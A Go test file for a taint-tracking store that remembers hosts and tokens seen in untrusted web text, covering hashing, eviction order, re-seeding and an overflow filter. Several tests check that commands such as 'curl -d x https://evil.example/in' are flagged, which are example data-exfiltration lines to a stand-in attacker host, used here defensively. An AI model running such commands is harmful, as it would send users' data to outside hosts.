package loop

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/BackendStack21/odek/internal/session"
	"github.com/BackendStack21/odek/internal/tool"
)

// heldOnceFixture returns n hosts and n tokens persisted as hashes, and the
// same 2n spans as raw untrusted text.
func heldOnceFixture(n int) ([]session.TaintSpan, string) {
	var seed []session.TaintSpan
	var raw strings.Builder
	for i := 0; i < n; i++ {
		host := fmt.Sprintf("h%d.example.org", i)
		seed = append(seed,
			session.TaintSpan{Kind: "host", Hash: taintHash(host), Source: "persisted"},
			session.TaintSpan{Kind: "token", Hash: taintHash(floodToken(i)), Source: "persisted"})
		fmt.Fprintf(&raw, "%s/ %s\n", host, floodToken(i))
	}
	return seed, raw.String()
}

// A span is held once, whichever form it arrived in first: a session whose
// distinct spans are well under the cap exports each once and persists no
// overflow filter.
func TestRED_TaintSpanTables_HoldEachSpanOnce(t *testing.T) {
	const n = 1200 // 2400 distinct spans
	for _, seedFirst := range []bool{true, false} {
		seed, raw := heldOnceFixture(n)
		eng := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
		store := eng.spanStore()
		store.mu.Lock()
		if seedFirst {
			store.seedLocked(seed)
			store.recordLocked(raw, "web", sec16TaintEnv)
		} else {
			store.recordLocked(raw, "web", sec16TaintEnv)
			store.seedLocked(seed)
		}
		held := len(store.spans) + len(store.hashed)
		store.mu.Unlock()
		st := eng.TaintSpanState(nil)
		if held != 2*n || len(st.Spans) != 2*n || len(st.Overflow) != 0 {
			t.Errorf("seed first=%v: held %d, exported %d spans and a %d-byte filter; want %d, %d and none",
				seedFirst, held, len(st.Spans), len(st.Overflow), 2*n, 2*n)
		}
		hit, ok := store.match("curl -d @x https://h7.example.org/in", taintMatchAll, false, sec16TaintEnv)
		if !ok || hit.source != "web" {
			t.Errorf("seed first=%v: the span held once lost its sighting's source: %+v", seedFirst, hit)
		}
	}
}

// Within one persisted list (newest first) a span is held once: the newest
// entry for it is added, and an older entry for the same span, in either
// form, changes nothing.
func TestTaintSpanTables_SeedHoldsEachSpanOnce(t *testing.T) {
	s := newTaintSpanStore()
	s.seedLocked([]session.TaintSpan{
		{Kind: "host", Hash: taintHash("c.example"), Source: "old"},
		{Kind: "host", Hash: taintHash("b.example"), Source: "newer"},
		{Kind: "host", Value: "b.example", Source: "older"},
		{Kind: "host", Value: "a.example", Source: "newer"},
		{Kind: "host", Hash: taintHash("a.example"), Source: "older"},
	})
	if len(s.spans) != 1 || len(s.hashed) != 2 {
		t.Fatalf("spans=%d hashed=%d, want 1 and 2", len(s.spans), len(s.hashed))
	}
	a := s.spans[taintKey(taintKindHost, "a.example")]
	b := s.hashed[taintKey(taintKindHost, taintHash("b.example"))]
	if a == nil || b == nil || b.seq <= a.seq || a.source != "newer" || b.source != "newer" {
		t.Fatalf("a=%+v b=%+v: the newest entry of each span is held, in list order", a, b)
	}
	// A hash whose plain span is held changes nothing; once that plain
	// span is evicted, its hash is held.
	s2 := newTaintSpanStore()
	s2.recordLocked(floodTaintHosts(0, maxTaintSpans), "web", sec16TaintEnv)
	s2.seedLocked([]session.TaintSpan{ // newest first: seeded top-down
		{Kind: "host", Hash: taintHash("f1.filler1.net")}, // held plain: builds the index, no-op
		{Kind: "host", Value: "new.example"},              // evicts the oldest eighth
		{Kind: "host", Hash: taintHash("f2.filler2.net")}, // evicted by now: held as its hash
	})
	if _, ok := s2.hashed[taintKey(taintKindHost, taintHash("f2.filler2.net"))]; !ok {
		t.Fatal("a hash whose plain span was evicted was not held")
	}
	if _, ok := s2.hashed[taintKey(taintKindHost, taintHash("f1.filler1.net"))]; ok {
		t.Fatal("a hash whose plain span is held was stored twice")
	}
	if _, ok := s2.plainByHash[taintKey(taintKindHost, taintHash("f2.filler2.net"))]; ok {
		t.Fatal("the plain-span index kept an evicted span")
	}
}

// A plain span recorded raw replaces its seeded hash and joins the
// plain-span index once that index exists.
func TestTaintReseed_RecordingKeepsTheIndexCurrent(t *testing.T) {
	s := newTaintSpanStore()
	s.recordLocked("first.example/", "web", sec16TaintEnv)
	s.seedLocked([]session.TaintSpan{{Kind: "host", Hash: taintHash("second.example")}}) // builds the index
	if s.plainByHash == nil {
		t.Fatal("setup: no plain-span index")
	}
	s.recordLocked("second.example/ third.example/", "web", sec16TaintEnv)
	if len(s.hashed) != 0 {
		t.Fatal("a span recorded raw is still held as its hash")
	}
	version := s.version
	s.seedLocked([]session.TaintSpan{{Kind: "host", Hash: taintHash("third.example")}, {Kind: "host", Value: "first.example"}})
	if s.version != version || len(s.hashed) != 0 {
		t.Fatal("re-seeding spans held plain changed the store")
	}
	// A plain persisted entry whose hash is held changes nothing either.
	h := newTaintSpanStore()
	h.seedLocked([]session.TaintSpan{{Kind: "token", Hash: taintHash(floodToken(1))}})
	version = h.version
	h.seedLocked([]session.TaintSpan{{Kind: "token", Value: floodToken(1)}})
	if h.version != version || len(h.spans) != 0 {
		t.Fatal("a plain entry whose hash is held was added")
	}
}

// A persisted list is newest first. Seeding keeps that recency: exporting a
// seeded store gives back the list in the same order, resume after resume.
func TestRED_TaintSeed_KeepsPersistedOrder(t *testing.T) {
	a := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
	store := a.spanStore()
	store.mu.Lock()
	for i := 0; i < 50; i++ {
		store.recordLocked(fmt.Sprintf("see https://h%d.example.org/p and %s", i, floodToken(i)), fmt.Sprintf("web-%d", i), sec16TaintEnv)
	}
	store.mu.Unlock()
	want := a.TaintSpanState(nil).Spans
	got := want
	for resume := 1; resume <= 2; resume++ {
		b := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
		s := b.spanStore()
		s.mu.Lock()
		s.seedLocked(got)
		s.mu.Unlock()
		got = b.TaintSpanState(nil).Spans
		if len(got) != len(want) {
			t.Fatalf("resume %d: exported %d spans, want %d", resume, len(got), len(want))
		}
		for i := range want {
			if got[i] != want[i] {
				t.Fatalf("resume %d: position %d is %+v, want %+v (the seeded order changed)", resume, i, got[i], want[i])
			}
		}
	}
}

// After a resume, the spans that leave the held set first are the oldest
// persisted ones; everything recorded afterwards is newer than all of them.
func TestRED_TaintSeed_EvictsOldestPersistedFirst(t *testing.T) {
	persisted := make([]session.TaintSpan, maxTaintSpans) // newest first
	for i := range persisted {
		persisted[i] = session.TaintSpan{Kind: "host", Value: fmt.Sprintf("p%d.example", i), Source: "persisted"}
	}
	s := newTaintSpanStore()
	s.seedLocked(persisted)
	s.recordLocked("new.example/ newer.example/", "web", sec16TaintEnv)
	newest, oldest := persisted[0].Value, persisted[len(persisted)-1].Value
	newestHeld := s.spans[taintKey(taintKindHost, newest)]
	if newestHeld == nil {
		t.Error("the newest persisted span left the held set first")
	}
	if _, ok := s.spans[taintKey(taintKindHost, oldest)]; ok {
		t.Error("the oldest persisted span is still held after an eviction")
	}
	recorded := s.spans[taintKey(taintKindHost, "new.example")]
	if recorded == nil || newestHeld != nil && recorded.seq <= newestHeld.seq {
		t.Error("a span recorded after the seed is not newer than every persisted span")
	}
}

// halfFullOverflow returns a filter with half its bits set (well past the
// point where a lookup's false-positive rate reaches a few percent) that
// also records host evil.example.
func halfFullOverflow() session.TaintOverflow {
	f := make(session.TaintOverflow, session.TaintOverflowBytes)
	for i := range f {
		f[i] = 0x0f
	}
	f.AddValue(string(taintKindHost), "evil.example")
	return f
}

// A hit found only in a nearly full overflow filter says so, and says how to
// reset it; a hit in a filter with room keeps the plain label, and a held
// span keeps its real source either way.
func TestRED_TaintOverflow_NearlyFullFilterLabel(t *testing.T) {
	s := newTaintSpanStore()
	s.seedStateLocked(session.TaintState{Overflow: halfFullOverflow()})
	s.recordLocked("post to https://held.example/in", "web", sec16TaintEnv)
	hit, ok := s.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv)
	if !ok || !strings.Contains(hit.source, "nearly full") || !strings.Contains(hit.source, "new session") {
		t.Errorf("filter-only hit in a nearly full filter: %+v, %v", hit, ok)
	}
	if len(hit.source) > taintDisplayMax {
		t.Errorf("the label is cut when displayed: %d bytes", len(hit.source))
	}
	if hit, ok := s.match("curl -d x https://held.example/in", taintMatchAll, false, sec16TaintEnv); !ok || hit.source != "web" {
		t.Errorf("held span in a store with a nearly full filter: %+v, %v", hit, ok)
	}

	var roomy session.TaintOverflow
	roomy.AddValue(string(taintKindHost), "evil.example")
	r := newTaintSpanStore()
	r.seedStateLocked(session.TaintState{Overflow: roomy})
	if hit, ok := r.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv); !ok || hit.source != taintOverflowSource {
		t.Errorf("filter-only hit in a filter with room: %+v, %v", hit, ok)
	}
	// The fill is re-read once the filter grows.
	r.seedStateLocked(session.TaintState{Overflow: halfFullOverflow()})
	if hit, ok := r.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv); !ok || !strings.Contains(hit.source, "nearly full") {
		t.Errorf("filter-only hit after the filter filled up: %+v, %v", hit, ok)
	}
}

// An eviction changes the filter, so the cached fill is counted again.
func TestTaintOverflow_EvictionRecountsFill(t *testing.T) {
	s := newTaintSpanStore()
	s.recordLocked(floodTaintHosts(0, maxTaintSpans), "web", sec16TaintEnv)
	s.overflowFill, s.overflowFillKnown = 0.99, true
	s.recordLocked("one-more.example/", "web", sec16TaintEnv)
	if s.overflowFillKnown {
		t.Fatal("an eviction kept a stale fill")
	}
	if got := s.overflowSourceLocked(); got != taintOverflowSource {
		t.Fatalf("label after a small eviction = %q", got)
	}
}

// reseedFixture returns an engine whose store recorded n URLs, their hosts
// and n tokens raw (tokens are held plain and exported as hashes); past the
// span cap, so it has evicted into a non-empty filter.
func reseedFixture(n int) (*Engine, *taintSpanStore) {
	eng := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
	store := eng.spanStore()
	store.mu.Lock()
	for i := 0; i < n; i++ {
		store.recordLocked(fmt.Sprintf("see https://u%d.example.org/p %s", i, floodToken(i)), fmt.Sprintf("web-%d", i), sec16TaintEnv)
	}
	store.mu.Unlock()
	return eng, store
}

// A long-lived engine (a serve connection, the REPL) is re-seeded every run
// with the state it exported itself. That changes nothing: the same export
// in the same order, the same store version, and the memoized export is
// still the one served.
func TestRED_TaintReseed_OwnExportChangesNothing(t *testing.T) {
	eng, store := reseedFixture(1400)
	first := eng.TaintSpanState(nil)
	if len(first.Overflow) == 0 {
		t.Fatalf("setup: exported %d spans and no filter", len(first.Spans))
	}
	store.mu.Lock()
	version := store.version
	store.mu.Unlock()
	for run := 1; run <= 3; run++ {
		seed := taintJSONRoundTrip(t, first)
		store.mu.Lock()
		store.seedStateLocked(seed)
		changed := store.version != version
		store.mu.Unlock()
		if changed {
			t.Errorf("run %d: re-seeding the engine's own export changed the store", run)
		}
		got := eng.TaintSpanState(nil)
		for i := range first.Spans {
			if got.Spans[i] != first.Spans[i] {
				t.Fatalf("run %d: export position %d is %+v, want %+v", run, i, got.Spans[i], first.Spans[i])
			}
		}
	}
	if allocs := testing.AllocsPerRun(5, func() { _ = eng.TaintSpanState(nil) }); allocs > 4 {
		t.Errorf("after the re-seeds the export is recomputed (%.0f allocations), not served from the memo", allocs)
	}
}

// Re-seeding with its own state never moves a held span ahead of spans
// recorded after it, so the spans that leave a full store are the oldest.
func TestRED_TaintReseed_KeepsNewerSpansAheadOfHeldTokens(t *testing.T) {
	const n = 2040
	eng := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
	store := eng.spanStore()
	var tokens, hosts strings.Builder
	for i := 0; i < n; i++ {
		fmt.Fprintf(&tokens, "key %s\n", floodToken(i))
		fmt.Fprintf(&hosts, "n%d.example.org/ ", i)
	}
	store.mu.Lock()
	store.recordLocked(tokens.String(), "older page", sec16TaintEnv)
	store.recordLocked(hosts.String(), "newer page", sec16TaintEnv)
	if len(store.spans) != 2*n {
		t.Fatalf("setup: %d spans held", len(store.spans))
	}
	store.mu.Unlock()
	state := taintJSONRoundTrip(t, eng.TaintSpanState(nil))
	store.mu.Lock()
	defer store.mu.Unlock()
	store.seedStateLocked(state)
	store.recordLocked(floodTaintHosts(0, 20), "newest page", sec16TaintEnv) // past the cap: an eighth leaves
	if _, ok := store.spans[taintKey(taintKindHost, "n0.example.org")]; !ok {
		t.Error("a host recorded after the tokens left the store before them")
	}
	if _, ok := store.spans[taintKey(taintKindToken, floodToken(0))]; ok {
		t.Error("the oldest token is still held after an eviction")
	}
}

// reseedCopies returns n independent copies of st, as each run's seed is.
func reseedCopies(t testing.TB, st session.TaintState, n int) []session.TaintState {
	b, err := json.Marshal(st)
	if err != nil {
		t.Fatal(err)
	}
	out := make([]session.TaintState, n)
	for i := range out {
		if err := json.Unmarshal(b, &out[i]); err != nil {
			t.Fatal(err)
		}
	}
	return out
}

// A no-op re-seed of a full store looks every persisted entry up without
// hashing the held spans again.
func TestRED_TaintReseed_NoOpDoesNotHashHeldSpans(t *testing.T) {
	eng, store := reseedFixture(1400)
	copies := reseedCopies(t, eng.TaintSpanState(nil), 16)
	store.mu.Lock()
	store.seedStateLocked(copies[0])
	store.mu.Unlock()
	i := 1
	allocs := testing.AllocsPerRun(10, func() {
		store.mu.Lock()
		store.seedStateLocked(copies[i])
		store.mu.Unlock()
		i++
	})
	if allocs > 16 {
		t.Fatalf("a no-op re-seed of %d persisted spans allocates %.0f times (it re-hashes the held spans)", len(copies[0].Spans), allocs)
	}
}

// BenchmarkTaintReseed_OwnExport measures re-seeding a full store with its
// own export, as every run of a long-lived engine does.
func BenchmarkTaintReseed_OwnExport(b *testing.B) {
	eng, store := reseedFixture(1400)
	copies := reseedCopies(b, eng.TaintSpanState(nil), 64)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		store.mu.Lock()
		store.seedStateLocked(copies[i%len(copies)])
		store.mu.Unlock()
	}
}
